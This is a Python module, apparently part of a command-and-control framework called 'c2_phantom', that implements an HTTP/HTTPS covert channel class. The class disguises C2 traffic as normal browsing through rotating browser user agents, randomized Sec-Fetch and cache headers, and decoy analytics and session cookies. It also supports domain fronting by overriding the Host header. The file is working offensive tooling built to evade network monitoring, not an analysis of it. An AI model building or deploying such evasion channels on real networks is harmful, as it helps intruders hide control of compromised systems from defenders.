"""
HTTP/HTTPS covert channel implementation.

Provides covert communication over HTTP/HTTPS with header randomization,
user agent rotation, and domain fronting capabilities.
"""

import random
import asyncio
from typing import Dict, List, Optional, Any
from datetime import datetime

import aiohttp
from aiohttp import ClientSession, ClientTimeout

from c2_phantom.core.exceptions import NetworkError


class HTTPChannel:
    """HTTP/HTTPS covert channel with traffic obfuscation."""

    DEFAULT_USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    ]

    COMMON_HEADERS = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "DNT": "1",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
    }

    def __init__(
        self,
        base_url: str,
        timeout: int = 30,
        verify_ssl: bool = True,
        domain_front: Optional[str] = None,
        proxy: Optional[str] = None,
    ) -> None:
        """
        Initialize HTTP channel.

        Args:
            base_url: Base URL for communication
            timeout: Request timeout in seconds
            verify_ssl: Verify SSL certificates
            domain_front: Domain fronting target
            proxy: Proxy URL
        """
        self.base_url = base_url
        self.timeout = ClientTimeout(total=timeout)
        self.verify_ssl = verify_ssl
        self.domain_front = domain_front
        self.proxy = proxy
        self._session: Optional[ClientSession] = None

    def _get_random_headers(self) -> Dict[str, str]:
        """
        Generate randomized HTTP headers.

        Returns:
            Dictionary of HTTP headers
        """
        headers = self.COMMON_HEADERS.copy()
        headers["User-Agent"] = random.choice(self.DEFAULT_USER_AGENTS)

        # Add random legitimate-looking headers
        if random.random() > 0.5:
            headers["Cache-Control"] = random.choice(["no-cache", "max-age=0"])

        if random.random() > 0.5:
            headers["Sec-Fetch-Site"] = random.choice(["same-origin", "cross-site", "none"])
            headers["Sec-Fetch-Mode"] = random.choice(["navigate", "cors", "no-cors"])
            headers["Sec-Fetch-Dest"] = random.choice(["document", "empty"])

        # Domain fronting: Set Host header if configured
        if self.domain_front:
            headers["Host"] = self.domain_front

        return headers

    def _add_random_cookies(self) -> Dict[str, str]:
        """
        Generate random cookies to blend in.

        Returns:
            Dictionary of cookies
        """
        cookie_names = ["_ga", "_gid", "session_id", "token", "__cfduid", "PHPSESSID"]
        cookies = {}

        # Randomly add 1-3 cookies
        num_cookies = random.randint(1, 3)
        for _ in range(num_cookies):
            name = random.choice(cookie_names)
            value = "".join(random.choices("0123456789abcdef", k=32))
            cookies[name] = value

        return cookies

    async def _get_session(self) -> ClientSession:
        """
        Get or create aiohttp session.

        Returns:
            ClientSession instance
        """
        if self._session is None or self._session.closed:
            connector = aiohttp.TCPConnector(ssl=self.verify_ssl)
            self._session = ClientSession(
                connector=connector,
                timeout=self.timeout,
            )
        return self._session

    async def send_request(
        self,
        method: str,
        endpoint: str,
        data: Optional[bytes] = None,
        params: Optional[Dict[str, str]] = None,
    ) -> Dict[str, Any]:
        """
        Send HTTP request with obfuscation.

        Args:
            method: HTTP method (GET, POST, etc.)
            endpoint: API endpoint
            data: Optional request data
            params: Optional query parameters

        Returns:
            Response data

        Raises:
            NetworkError: If request fails
        """
        try:
            session = await self._get_session()
            url = f"{self.base_url}/{endpoint.lstrip('/')}"

            headers = self._get_random_headers()
            cookies = self._add_random_cookies()

            async with session.request(
                method=method,
                url=url,
                data=data,
                params=params,
                headers=headers,
                cookies=cookies,
                proxy=self.proxy,
            ) as response:
                response_data = await response.read()

                return {
                    "status": response.status,
                    "headers": dict(response.headers),
                    "data": response_data,
                    "timestamp": datetime.now().isoformat(),
                }

        except asyncio.TimeoutError:
            raise NetworkError("HTTP request timeout")
        except aiohttp.ClientError as e:
            raise NetworkError(f"HTTP request failed: {str(e)}")
        except Exception as e:
            raise NetworkError(f"Unexpected error: {str(e)}")

    async def get(self, endpoint: str, params: Optional[Dict[str, str]] = None) -> Dict[str, Any]:
        """
        Send GET request.

        Args:
            endpoint: API endpoint
            params: Optional query parameters

        Returns:
            Response data
        """
        return await self.send_request("GET", endpoint, params=params)

    async def post(
        self, endpoint: str, data: Optional[bytes] = None, params: Optional[Dict[str, str]] = None
    ) -> Dict[str, Any]:
        """
        Send POST request.

        Args:
            endpoint: API endpoint
            data: Request data
            params: Optional query parameters

        Returns:
            Response data
        """
        return await self.send_request("POST", endpoint, data=data, params=params)

    async def put(
        self, endpoint: str, data: Optional[bytes] = None, params: Optional[Dict[str, str]] = None
    ) -> Dict[str, Any]:
        """
        Send PUT request.

        Args:
            endpoint: API endpoint
            data: Request data
            params: Optional query parameters

        Returns:
            Response data
        """
        return await self.send_request("PUT", endpoint, data=data, params=params)

    async def delete(self, endpoint: str, params: Optional[Dict[str, str]] = None) -> Dict[str, Any]:
        """
        Send DELETE request.

        Args:
            endpoint: API endpoint
            params: Optional query parameters

        Returns:
            Response data
        """
        return await self.send_request("DELETE", endpoint, params=params)

    async def close(self) -> None:
        """Close the HTTP session."""
        if self._session is not None and not self._session.closed:
            await self._session.close()

    async def __aenter__(self) -> "HTTPChannel":
        """Async context manager entry."""
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb) -> None:
        """Async context manager exit."""
        await self.close()
